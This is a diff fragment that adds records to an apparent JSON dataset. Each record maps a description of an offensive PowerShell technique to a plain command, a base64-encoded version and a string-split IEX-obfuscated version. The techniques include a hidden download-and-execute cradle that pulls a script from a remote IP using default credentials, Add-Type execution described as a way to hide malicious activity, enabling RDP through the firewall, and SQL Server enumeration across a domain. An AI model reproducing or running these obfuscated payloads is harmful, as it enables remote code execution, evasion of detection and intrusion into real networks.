[''+''Sy''+''st''+''em''+''.E''+''nu''+''m]''+''::''+''Ge''+''tN''+''am''+''e(''+''[S''+''ys''+''te''+''m.''+''Wi''+''nd''+''ow''+''s.''+''Fo''+''rm''+''s.''+''Ke''+''ys''+''],''+'' $''+''i)''+'' W''+''ri''+''te''+''-H''+''os''+''t ''+''$K''+''ey''+'' }''+'' }''+'' }')"
+    ]
+  },
+  {
+    "input": "Utilizing PowerShell Add-Type for Code Execution, Defines and executes code within a custom .NET class using PowerShell, which can be used to hide malicious activities within seemingly benign code.",
+    "outputs": [
+      "Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(\"Executed\"); } }'; [MyClass]::Run()",
+      "powershell -enc QQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAnAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsAIABwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAE0AeQBDAGwAYQBzAHMAIAB7ACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAHYAbwBpAGQAIABSAHUAbgAoACkAIAB7ACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBFAHgAZQBjAHUAdABlAGQAIgApADsAIAB9ACAAfQAnADsAIABbAE0AeQBDAGwAYQBzAHMAXQA6ADoAUgB1AG4AKAApAA==",
+      "IEX('Ad''+''d-''+''Ty''+''pe''+'' -''+''Ty''+''pe''+''De''+''fi''+''ni''+''ti''+''on''+'' '''+''us''+''in''+''g ''+''Sy''+''st''+''em''+''; ''+''pu''+''bl''+''ic''+'' c''+''la''+''ss''+'' M''+''yC''+''la''+''ss''+'' {''+'' p''+''ub''+''li''+''c ''+''st''+''at''+''ic''+'' v''+''oi''+''d ''+''Ru''+''n(''+'') ''+''{ ''+''Co''+''ns''+''ol''+''e.''+''Wr''+''it''+''eL''+''in''+''e(''+''\"E''+''xe''+''cu''+''te''+''d\"''+'');''+'' }''+'' }''+''';''+'' [''+''My''+''Cl''+''as''+''s]''+''::''+''Ru''+''n(''+'')')"
+    ]
+  },
+  {
+    "input": "This PowerShell command downloads and executes a script from the specified URL (http://10.9.122.8:8080/AZPLhG9txdFhS9n), configuring a web client with system proxy settings and default credentials.",
+    "outputs": [
+      "powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJABrAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGsALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAGsALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADEAMgAyAC4AOAA6ADgAMAA4ADAALwBBAFoAUABMAGgARwA5AHQAeABkAEYAaABTADkAbgAnACkAOwA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''no''+''p ''+''-w''+'' h''+''id''+''de''+''n ''+''-c''+'' $''+''k=''+''ne''+''w-''+''ob''+''je''+''ct''+'' n''+''et''+''.w''+''eb''+''cl''+''ie''+''nt''+'';$''+''k.''+''pr''+''ox''+''y=''+''[N''+''et''+''.W''+''eb''+''Re''+''qu''+''es''+''t]''+''::''+''Ge''+''tS''+''ys''+''te''+''mW''+''eb''+''Pr''+''ox''+''y(''+'');''+''$k''+''.P''+''ro''+''xy''+''.C''+''re''+''de''+''nt''+''ia''+''ls''+''=[''+''Ne''+''t.''+''Cr''+''ed''+''en''+''ti''+''al''+''Ca''+''ch''+''e]''+''::''+''De''+''fa''+''ul''+''tC''+''re''+''de''+''nt''+''ia''+''ls''+'';I''+''EX''+'' $''+''k.''+''do''+''wn''+''lo''+''ad''+''st''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/1''+''0.''+''9.''+''12''+''2.''+''8:''+''80''+''80''+''/A''+''ZP''+''Lh''+''G9''+''tx''+''dF''+''hS''+''9n''+''')''+'';')"
+    ]
+  },
+  {
+    "input": "Allow Remote Desktop connections, Allow RDP on the firewall",
+    "outputs": [
+      "Get-NetFirewallRule -DisplayGroup \"Remote Desktop\" | Set-NetFirewallRule -Enabled True",
+      "powershell -enc RwBlAHQALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBHAHIAbwB1AHAAIAAiAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAiACAAfAAgAFMAZQB0AC0ATgBlAHQARgBpAHIAZQB3AGEAbABsAFIAdQBsAGUAIAAtAEUAbgBhAGIAbABlAGQAIABUAHIAdQBlAA==",
+      "IEX('Ge''+''t-''+''Ne''+''tF''+''ir''+''ew''+''al''+''lR''+''ul''+''e ''+''-D''+''is''+''pl''+''ay''+''Gr''+''ou''+''p ''+''\"R''+''em''+''ot''+''e ''+''De''+''sk''+''to''+''p\"''+'' |''+'' S''+''et''+''-N''+''et''+''Fi''+''re''+''wa''+''ll''+''Ru''+''le''+'' -''+''En''+''ab''+''le''+''d ''+''Tr''+''ue')"
+    ]
+  },
+  {
+    "input": "Get DBs, test connections and get info in oneliner",
+    "outputs": [
+      "Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo",
+      "powershell -enc RwBlAHQALQBTAFEATABJAG4AcwB0AGEAbgBjAGUARABvAG0AYQBpAG4AIAB8ACAARwBlAHQALQBTAFEATABDAG8AbgBuAGUAYwB0AGkAbwBuAFQAZQBzAHQAIAB8ACAAPwAgAHsAIAAkAF8ALgBTAHQAYQB0AHUAcwAgAC0AZQBxACAAIgBBAGMAYwBlAHMAcwBpAGIAbABlACIAIAB9ACAAfAAgAEcAZQB0AC0AUwBRAEwAUwBlAHIAdgBlAHIASQBuAGYAbwA=",
+      "IEX('Ge''+''t-''+''SQ''+''LI''+''ns''+''ta''+''nc''+''eD''+''om''+''ai''+''n ''+''| ''+''Ge''+''t-''+''SQ''+''LC''+''on''+''ne''+''ct''+''io''+''nT''+''es''+''t ''+''| ''+''? ''+''{ ''+''$_''+''.S''+''ta''+''tu''+''s ''+''-e''+''q ''+''\"A''+''cc''+''es''+''si''+''bl''+''e\"''+'' }''+'' |''+'' G''+''et''+''-S''+''QL''+''Se''+''rv''+''er''+''In''+''fo')"
+    ]
+  }
+]
